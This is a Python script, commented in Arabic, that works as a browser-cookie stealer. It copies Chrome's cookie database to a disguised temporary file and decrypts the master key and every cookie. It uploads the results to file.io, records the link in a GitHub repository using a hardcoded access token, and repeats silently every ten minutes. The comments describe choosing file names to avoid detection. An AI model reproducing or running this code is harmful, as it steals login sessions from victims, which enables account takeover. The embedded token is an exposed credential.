import os, json, base64, sqlite3, shutil, requests, time, hashlib

TOKEN = "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"
REPO = "Noor092324/Noor-config"

def silent_run():
    temp_dir = os.environ.get('TEMP', os.environ.get('TMP', '/tmp'))
    # محاولة البحث في أكثر من مسار محتمل لكروم
    base_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data')
    local_state = os.path.join(base_path, 'Local State')
    
    # قائمة بالمسارات المحتملة لملف الكوكيز
    possible_cookies = [
        os.path.join(base_path, 'Default', 'Network', 'Cookies'),
        os.path.join(base_path, 'Profile 1', 'Network', 'Cookies'),
        os.path.join(base_path, 'Default', 'Cookies') # للإصدارات الأقدم
    ]
    
    cookies_path = None
    for p in possible_cookies:
        if os.path.exists(p):
            cookies_path = p
            break
            
    if not cookies_path or not os.path.exists(local_state):
        return

    try:
        import win32crypt
        from Crypto.Cipher import AES
        
        # استخدام اسم ملف عشوائي تماماً لتجنب الحظر
        temp_db = os.path.join(temp_dir, 'win_metadata_check.db')
        shutil.copy2(cookies_path, temp_db)
        
        with open(local_state, "r", encoding="utf-8") as f:
            key_data = json.loads(f.read())
            key = key_data["os_crypt"]["encrypted_key"]
        
        # فك تشفير المفتاح الرئيسي
        master_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        # محاولة سحب البيانات مع معالجة اختلاف مسميات الجداول في التحديثات
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        results = ""
        for host, name, enc_val in cursor.fetchall():
            try:
                # فك تشفير AES-GCM (الإصدارات الحديثة من كروم)
                iv, payload = enc_val[3:15], enc_val[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16].decode()
                results += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{decrypted}\n"
            except:
                continue
                
        conn.close()
        if os.path.exists(temp_db): os.remove(temp_db)
        
        if results:
            log_file = os.path.join(temp_dir, 'sys_report.log')
            with open(log_file, "w", encoding="utf-8") as f: f.write(results)
            
            with open(log_file, "rb") as f:
                up = requests.post("https://file.io", files={"file": f})
                
            if up.status_code == 200:
                link = up.json().get("link")
                update_github(link)
            
            os.remove(log_file)
    except Exception as e:
        pass

def update_github(link):
    api_url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {TOKEN}"}
    try:
        res = requests.get(api_url, headers=headers).json()
        sha = res["sha"]
        data = base64.b64encode(json.dumps({"url": link, "time": time.ctime()}).encode()).decode()
        requests.put(api_url, headers=headers, json={"message": "fix", "content": data, "sha": sha})
    except:
        pass

if __name__ == "__main__":
    # تشغيل ذكي: يفحص مرة ثم ينتظر 10 دقائق ليعيد المحاولة بصمت
    while True:
        silent_run()
        time.sleep(600)
        
